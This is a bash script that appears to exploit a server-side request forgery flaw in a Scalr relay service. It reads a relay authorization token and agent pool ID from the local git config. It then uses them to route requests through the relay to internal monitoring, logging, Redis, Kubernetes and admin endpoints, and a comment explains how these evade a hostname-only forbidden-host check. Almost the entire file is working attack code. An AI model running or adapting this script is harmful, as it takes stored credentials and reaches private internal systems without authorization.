#!/bin/bash
JWT=$(grep -oP '(?<=x-relay-authorization:)\S+' "$XDG_CONFIG_HOME/git/config" 2>/dev/null)
POOL=$(grep -oiP '(?<=x-relay-agent-pool-id:)\S+' "$XDG_CONFIG_HOME/git/config" 2>/dev/null)

rp() {
  local label=$1 url=$2; shift 2
  CODE=$(curl -sSLo /tmp/rp.bin -w "%{http_code}" --max-time 8 "$@" \
    -H "x-relay-authorization: $JWT" -H "X-Relay-Agent-Pool-ID: $POOL" \
    "https://relay.main.scalr.dev/$url" 2>/dev/null)
  BODY=$(python3 -c "
import gzip
d=open('/tmp/rp.bin','rb').read()
try: d=gzip.decompress(d)
except: pass
print(d.decode('utf-8','replace')[:300])" 2>/dev/null | tr '\n' ' ')
  echo "[R] $label → $CODE | $BODY"
}

# Wildcard *.internal.main.scalr.dev — all resolve to 10.30.0.2
# These pass is_forbidden_host() (hostname, no DNS resolution)
rp "grafana" "https://grafana.internal.main.scalr.dev/api/health"
rp "grafana-dash" "https://grafana.internal.main.scalr.dev/api/dashboards/home"
rp "prometheus" "https://prometheus.internal.main.scalr.dev/"
rp "alertmanager" "https://alertmanager.internal.main.scalr.dev/"
rp "kibana" "https://kibana.internal.main.scalr.dev/"
rp "jaeger" "https://jaeger.internal.main.scalr.dev/"
rp "zipkin" "https://zipkin.internal.main.scalr.dev/"
rp "redis-insight" "https://redis.internal.main.scalr.dev/"
rp "k8s-dashboard" "https://kubernetes-dashboard.internal.main.scalr.dev/"
rp "taco-admin" "https://taco-admin.internal.main.scalr.dev/"
rp "flower" "https://flower.internal.main.scalr.dev/"

# Try terraform.io service discovery endpoint (confirms API version exposure)
rp "well-known-200" "https://internal.main.scalr.dev/.well-known/terraform.json"

echo "[done]"
